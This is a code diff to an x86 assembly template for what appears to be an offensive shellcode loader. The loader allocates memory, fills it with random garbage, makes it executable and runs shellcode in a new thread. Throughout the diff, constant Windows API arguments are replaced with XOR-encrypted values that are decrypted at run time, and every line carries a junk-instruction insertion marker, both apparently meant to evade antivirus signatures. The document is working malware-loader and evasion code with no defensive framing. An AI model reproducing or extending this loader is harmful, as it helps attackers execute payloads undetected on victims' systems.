@@ -301,52 +301,55 @@ entry:
 // ================================ prepare memory page ================================
 
   // allocate memory for shellcode
-  mov  {{.RegV.eax}}, [esp+0x08]               {{igi}} // address of VirtualAlloc
-  mov  {{.RegV.ecx}}, 0x04                     {{igi}} // flProtect PAGE_READWRITE
-  push {{.RegV.ecx}}                           {{igi}} // push arugment
-  mov  {{.RegV.edx}}, 0x3000                   {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
-  push {{.RegV.edx}}                           {{igi}} // push arugment
-  mov  {{.RegV.ecx}}, {{hex .MemRegionSize}}   {{igi}} // dwSize
-  push {{.RegV.ecx}}                           {{igi}} // push arugment
-  xor  {{.RegV.edx}}, {{.RegV.edx}}            {{igi}} // lpAddress
-  push {{.RegV.edx}}                           {{igi}} // push arugment
-  call {{.RegV.eax}}                           {{igi}} // call VirtualAlloc
+  mov  {{.RegV.eax}}, [esp+0x08]                               {{igi}} // address of VirtualAlloc
+  mov  {{.RegV.ecx}}, {{hex .PAData.Protect}}                  {{igi}} // PAGE_READWRITE
+  xor  {{.RegV.ecx}}, {{hex .PAKey.Protect}}                   {{igi}} // decrypt argument
+  push {{.RegV.ecx}}                                           {{igi}} // push arugment
+  mov  {{.RegV.edx}}, {{hex .PAData.AllocationType}}           {{igi}} // MEM_RESERVE|MEM_COMMIT
+  xor  {{.RegV.edx}}, {{hex .PAKey.AllocationType}}            {{igi}} // decrypt argument
+  push {{.RegV.edx}}                                           {{igi}} // push arugment
+  mov  {{.RegV.ecx}}, {{hex .MemRegionSize}}                   {{igi}} // dwSize
+  push {{.RegV.ecx}}                                           {{igi}} // push arugment
+  xor  {{.RegV.edx}}, {{.RegV.edx}}                            {{igi}} // lpAddress
+  push {{.RegV.edx}}                                           {{igi}} // push arugment
+  call {{.RegV.eax}}                                           {{igi}} // call VirtualAlloc
 
   // store allocated memory address
-  mov [esp+0x04], eax                          {{igi}}
+  mov [esp+0x04], eax                                          {{igi}}
 
   // padding garbage data to page
-  mov {{.RegV.edx}}, eax                       {{igi}}
-  mov {{.RegV.ecx}}, {{hex .EntryOffset}}      {{igi}}
+  mov {{.RegV.edx}}, eax                                       {{igi}}
+  mov {{.RegV.ecx}}, {{hex .EntryOffset}}                      {{igi}}
   // calculate a random seed from registers
-  add {{.RegV.eax}}, esp                       {{igi}}
-  add {{.RegV.eax}}, {{.Reg.ebx}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.ecx}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.edx}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.esi}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.edi}}              {{igi}}
+  add {{.RegV.eax}}, esp                                       {{igi}}
+  add {{.RegV.eax}}, {{.Reg.ebx}}                              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.ecx}}                              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.edx}}                              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.esi}}                              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.edi}}                              {{igi}}
  loop_padding:
   // it will waste some loop but clean code
-  call xor_shift                               {{igi}}
-  mov [{{.RegV.edx}}], {{.RegV.eax}}           {{igi}}
+  call xor_shift                                               {{igi}}
+  mov [{{.RegV.edx}}], {{.RegV.eax}}                           {{igi}}
   // check padding garbage is finish
-  inc {{.RegV.edx}}                            {{igi}}
-  dec {{.RegV.ecx}}                            {{igi}}
-  jnz loop_padding                             {{igi}}
+  inc {{.RegV.edx}}                                            {{igi}}
+  dec {{.RegV.ecx}}                                            {{igi}}
+  jnz loop_padding                                             {{igi}}
 
   // adjust memory region protect
-  mov  {{.RegV.eax}}, [esp+0x10]               {{igi}} // address of VirtualProtect
-  mov  {{.RegV.ecx}}, [esp+0x04]               {{igi}} // lpAddress
-  sub esp, 0x04                                {{igi}} // lpflOldProtect
-  push esp                                     {{igi}} // push argument
-  mov  {{.RegV.edx}}, 0x40                     {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
-  push {{.RegV.edx}}                           {{igi}} // push argument
-  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}   {{igi}} // dwSize
-  push {{.RegV.edx}}                           {{igi}} // push argument
-  mov  {{.RegV.edx}}, {{.RegV.ecx}}            {{igi}} // lpAddress
-  push {{.RegV.edx}}                           {{igi}} // push argument
-  call {{.RegV.eax}}                           {{igi}} // call VirtualProtect
-  add esp, 0x04                                {{igi}} // restore stack for old protect
+  mov  {{.RegV.eax}}, [esp+0x10]                               {{igi}} // address of VirtualProtect
+  mov  {{.RegV.ecx}}, [esp+0x04]                               {{igi}} // lpAddress
+  sub esp, 0x04                                                {{igi}} // lpflOldProtect
+  push esp                                                     {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{hex .PAData.NewProtect}}               {{igi}} // PAGE_EXECUTE_READWRITE
+  xor  {{.RegV.edx}}, {{hex .PAKey.NewProtect}}                {{igi}} // decrypt argument
+  push {{.RegV.edx}}                                           {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}                   {{igi}} // dwSize
+  push {{.RegV.edx}}                                           {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{.RegV.ecx}}                            {{igi}} // lpAddress
+  push {{.RegV.edx}}                                           {{igi}} // push argument
+  call {{.RegV.eax}}                                           {{igi}} // call VirtualProtect
+  add esp, 0x04                                                {{igi}} // restore stack for old protect
 
 // ================================= prepare shellcode =================================
 
@@ -424,7 +427,8 @@ entry:
   call {{.RegV.eax}}                           {{igi}} // call CreateThread
 
   {{if .NeedWaitThread}}
-    mov edx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
+    mov edx, {{hex .PAData.Infinite}}          {{igi}} // dwMilliseconds, INFINITE
+    xor edx, {{hex .PAKey.Infinite}}           {{igi}} // decrypt argument
     push edx                                   {{igi}} // push argument
     push eax                                   {{igi}} // hHandle, hThread
     mov {{.RegV.eax}}, [esp+0x20]              {{igi}} // address of WaitForSingleObject
@@ -463,7 +467,8 @@ entry:
   // release allocated memory page
   mov {{.RegV.eax}}, [esp+0x0C]                {{igi}} // address of VirtualFree
   mov {{.RegV.ecx}}, [esp+0x04]                {{igi}} // address of allocated memory
-  mov {{.RegV.edx}}, 0x8000                    {{igi}} // dwFreeType MEM_RELEASE
+  mov {{.RegV.edx}}, {{hex .PAData.FreeType}}  {{igi}} // dwFreeType MEM_RELEASE
+  xor {{.RegV.edx}}, {{hex .PAKey.FreeType}}   {{igi}} // decrypt argument
   push {{.RegV.edx}}                           {{igi}} // push argument
   xor {{.RegV.edx}}, {{.RegV.edx}}             {{igi}} // dwSize
   push {{.RegV.edx}}                           {{igi}} // push argument
